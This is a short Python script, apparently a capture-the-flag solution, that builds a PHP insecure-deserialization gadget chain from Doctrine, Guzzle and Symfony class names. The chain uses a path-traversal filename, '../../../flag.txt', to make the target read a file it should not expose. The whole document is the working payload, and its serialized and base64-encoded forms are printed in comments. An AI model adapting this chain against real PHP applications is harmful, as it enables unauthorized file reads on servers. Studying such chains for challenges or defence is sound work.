from phpserialize import phpobject, serialize
from base64 import b64encode

normalizer = phpobject("Symfony\Polyfill\Intl\\Normalizer\\Normalizer",{
    "filename": "../../../flag.txt",
    "authorized_files": ["../../../flag.txt"]
})

pool = phpobject("GuzzleHttp\Pool",{
    "password": [normalizer]
})

token = phpobject("Doctrine\Common\Lexer\Token",{
    "callable": [pool]
})

serialized_object = serialize(token)

print(f"Objet sérialisé:\n{serialized_object.decode()}\n")
# O:27:"Doctrine\Common\Lexer\Token":1:{s:8:"callable";a:1:{i:0;O:15:"GuzzleHttp\Pool":1:{s:8:"password";a:1:{i:0;O:43:"Symfony\Polyfill\Intl\Normalizer\Normalizer":2:{s:8:"filename";s:17:"../../../flag.txt";s:16:"authorized_files";a:1:{i:0;s:17:"../../../flag.txt";}}}}}}

print(f"Base64:\n{b64encode(serialized_object).decode()}")
# TzoyNzoiRG9jdHJpbmVcQ29tbW9uXExleGVyXFRva2VuIjoxOntzOjg6ImNhbGxhYmxlIjthOjE6e2k6MDtPOjE1OiJHdXp6bGVIdHRwXFBvb2wiOjE6e3M6ODoicGFzc3dvcmQiO2E6MTp7aTowO086NDM6IlN5bWZvbnlcUG9seWZpbGxcSW50bFxOb3JtYWxpemVyXE5vcm1hbGl6ZXIiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTc6Ii4uLy4uLy4uL2ZsYWcudHh0IjtzOjE2OiJhdXRob3JpemVkX2ZpbGVzIjthOjE6e2k6MDtzOjE3OiIuLi8uLi8uLi9mbGFnLnR4dCI7fX19fX19
